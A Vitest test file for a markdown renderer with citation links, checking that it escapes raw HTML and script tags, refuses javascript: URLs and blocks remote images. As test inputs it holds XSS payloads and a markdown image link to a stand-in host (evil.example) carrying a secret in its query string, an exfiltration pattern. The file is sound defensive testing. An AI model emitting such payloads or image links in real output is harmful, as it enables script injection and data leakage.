import { describe, it, expect } from 'vitest'
import { renderMarkdown } from './markdown'

const cites = [
  { title: 'Fees on Solana', url: 'https://solana.com/docs/core/fees' },
  { title: 'Base fees', url: 'https://docs.base.org/fees' },
]

describe('renderMarkdown', () => {
  it('escapes raw HTML', () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)"> and <script>x</script>', [])
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<script')
    expect(html).toContain('&lt;img')
  })

  it('renders fenced code with a copy header', () => {
    const html = renderMarkdown('```bash\necho "<hi>"\n```', [], { copy: 'Copy' })
    expect(html).toContain('class="code-block"')
    expect(html).toContain('<span>bash</span>')
    expect(html).toContain('data-copy')
    expect(html).toContain('>Copy</button>')
    expect(html).toContain('echo &quot;&lt;hi&gt;&quot;')
  })

  it('links citation markers and leaves out-of-range ones', () => {
    const html = renderMarkdown('Fees are low ^1^ and data costs vary ^1,2^ but not ^7^.', cites)
    expect(html).toContain('<a class="cite" href="https://solana.com/docs/core/fees"')
    expect(html.match(/class="cite"/g)).toHaveLength(3)
    expect(html).toContain('^7^')
  })

  it('does not touch markers inside code', () => {
    const html = renderMarkdown('`x ^1^ y`\n\n```\n^2^\n```', cites)
    expect(html).not.toContain('class="cite"')
  })

  it('escapes citation titles and urls', () => {
    const html = renderMarkdown('see ^1^', [{ title: '"><script>', url: 'https://x.example/?a="b"' }])
    expect(html).not.toContain('<script>')
    expect(html).toContain('&quot;')
  })

  it('never links a citation whose url is not http(s)', () => {
    const html = renderMarkdown('see ^1^', [{ title: 't', url: 'javascript:alert(document.domain)' }])
    expect(html).not.toContain('javascript:')
    expect(html).toContain('^1^')
  })

  it('does not load remote images (no exfiltration through image URLs)', () => {
    const html = renderMarkdown('![x](https://evil.example/p.png?d=secret)', [])
    expect(html).not.toContain('<img')
  })

  it('opens links in a new tab safely', () => {
    const html = renderMarkdown('[docs](https://example.com) and https://bare.example', [])
    expect(html.match(/target="_blank"/g)).toHaveLength(2)
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('refuses javascript: links', () => {
    expect(renderMarkdown('[x](javascript:alert(1))', [])).not.toContain('href="javascript:')
  })
})
